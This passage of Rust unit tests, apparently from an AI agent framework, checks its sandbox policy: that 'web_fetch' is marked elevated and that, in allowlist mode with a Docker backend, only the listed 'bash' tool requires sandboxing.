        assert_eq!(p.elevated, vec!["web_fetch".to_string()]);
        assert!(p.requires_sandbox("bash"), "` bash ` passou a casar");
    }

    #[test]
    fn sandbox_allowlist_so_marca_as_tools_listadas() {
        let mut config = AppConfig::default();
        config.agent.sandbox.mode = garraia_config::SandboxMode::Allowlist;
        config.agent.sandbox.backend = Some(garraia_config::SandboxBackendKind::Docker);
        config.agent.sandbox.sandboxed_tools = vec!["bash".into()];
        let p = sandbox_policy_from(&config.agent.sandbox);
        assert!(p.requires_sandbox("bash"));
        assert!(!p.requires_sandbox("run_tests"));
    }
}
